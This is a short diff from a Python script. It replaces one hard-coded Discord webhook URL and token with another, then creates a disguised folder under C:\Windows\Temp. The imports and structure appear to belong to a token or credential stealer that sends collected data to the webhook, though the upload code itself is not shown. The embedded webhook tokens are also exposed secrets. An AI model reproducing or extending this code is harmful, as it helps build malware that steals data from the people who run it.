@@ -15,7 +15,7 @@ from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import timezone, datetime, timedelta
 
-webhook_url = "https://discord.com/api/webhooks/913148858337489016/p1xUBbcRJFmCmtcC7qJ3TuMIeYGT7BtYDgEFG2hMIxO5Y5c5p76Gf8P4zjG3G2A8IlyE"
+webhook_url = "https://discord.com/api/webhooks/913114636935639051/JULTS369KJGCNpceCiH7V6YXgZj4f8nEkbb-uQDrhP-9-2T_CCbw1-kDLFYNCD37MtTa"
 path = r'C:\Windows\Temp\LocalCustom\ssh\new\custom'
 if not os.path.exists(path):
     os.makedirs(path)
